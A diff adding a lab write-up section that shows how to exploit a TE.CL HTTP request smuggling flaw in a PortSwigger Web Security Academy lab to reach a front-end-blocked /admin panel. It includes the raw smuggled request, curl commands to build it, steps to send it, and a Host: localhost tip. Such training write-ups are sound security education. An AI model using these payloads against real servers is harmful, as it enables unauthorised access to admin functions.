@@ -202,3 +202,57 @@ curl -s -X POST http://localhost:8888/ --data-binary "@delete_payload" -H "Host:
 # Perform the request
 cat delete_smuggle | httpclient https://$LAB_URL
 ```
+
+## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+The following example is an alternative to PortSwigger Burp solution for their [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl).
+
+We know that:
+* back-end server doesn't support chunked encoding
+* there's an admin panel at `/admin`, but the front-end server blocks access to it
+
+We will smuggle an `/admin` request:
+```shell
+POST / HTTP/1.1
+Host: ac7d1fb41fa9b18fc0174145006d00f9.web-security-academy.net
+Transfer-Encoding: chunked    # <----- use by front-end
+Content-Length: 4
+Content-Type: application/x-www-form-urlencoded
+
+60          <----- end of request for the back-end
+POST /admin HTTP/1.1        <----- 2nd request for back-end
+Content-Length: 15
+Content-Type: application/x-www-form-urlencoded
+
+x=1
+0     # <----- end of request for the front-end
+
+```
+
+To construct this request:
+**1.** construct the `/admin`request:
+```shell
+httpecho -d admin
+curl http://localhost:8888/admin -H "Host:" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
+```
+
+**2.** Smuggle it within legit request:
+```shell
+httpecho -d bypass
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@admin"
+```
+
+**3.** Check request treatment by back-end:
+```shell
+cat bypass | httpcustomhouse -te | httpcustomhouse -cl -r
+```
+
+**4.** Send it
+```shell
+cat bypass | httpclient https://$LAB_URL
+cat bypass | httpclient https://$LAB_URL # twice to get result for the smuggled request
+[...]
+Admin interface only available to local users
+```
+
+You can only access admin panel from localhost -> add `Host: localhost` for the smuggling request
